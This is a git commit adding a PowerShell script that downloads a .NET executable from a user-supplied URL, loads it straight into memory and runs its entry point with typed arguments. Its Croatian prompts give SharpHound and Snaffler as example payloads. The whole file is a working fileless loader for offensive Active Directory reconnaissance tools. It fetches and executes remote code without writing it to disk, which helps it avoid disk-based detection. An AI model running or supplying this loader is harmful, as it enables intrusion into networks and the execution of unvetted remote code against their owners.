619552f5e49c1815c760fbecb74d31af72d02632
inkz1337 <113606031+inkz1337@users.noreply.github.com>
2023-09-18 12:27:05 +0200

    Add files via upload

---
+++ invoke_exe.ps1
@@ -0,0 +1,64 @@
+function Invoke-exe
+{
+    $exeAddr = Read-Host "URL exe fajla koji zelimo loadat"
+    $exeBytes = (New-Object Net.WebClient).DownloadData("$exeAddr")
+
+    if ($exeBytes -ne $null)
+    {
+        $exe = [System.Reflection.Assembly]::Load($exeBytes)
+
+        if ($exe -ne $null)
+        {
+            $vars = New-Object System.Collections.Generic.List[System.Object]
+            
+            
+            $parametersList = New-Object System.Collections.ArrayList
+
+            # Ask the user for switches until they enter an empty string
+            while ($true)
+            {
+                $switches = Read-Host "Unesi switcheve koje zelis svaki parametar mora biti u zasebno redu(npr. Sharphound -c enter all enter kad si gotov u prazno, ili kod snafflera -s enter -o enter log.txt i onda na kraju enter u praznom redu kada si gotov)"
+                if ([string]::IsNullOrWhiteSpace($switches))
+                {
+                    break  
+                }
+                else
+                {
+                    $parametersList.Add($switches)  
+                }
+            }
+
+            
+            $parametersArray = $parametersList.ToArray([string])
+
+            try
+            {
+                $entryPoint = $exe.EntryPoint
+
+                if ($entryPoint -ne $null)
+                {
+                    $null = $entryPoint.Invoke($null, @(,$parametersArray))
+                }
+                else
+                {
+                    Write-Host "The loaded assembly does not have an entry point."
+                }
+            }
+            catch
+            {
+                Write-Host "Greška: $_"
+            }
+        }
+        else
+        {
+            Write-Host "Problem loadanja exe fajla"
+        }
+    }
+    else
+    {
+        Write-Host "Problem skidanja exe fajla"
+    }
+}
+
+
+Invoke-exe
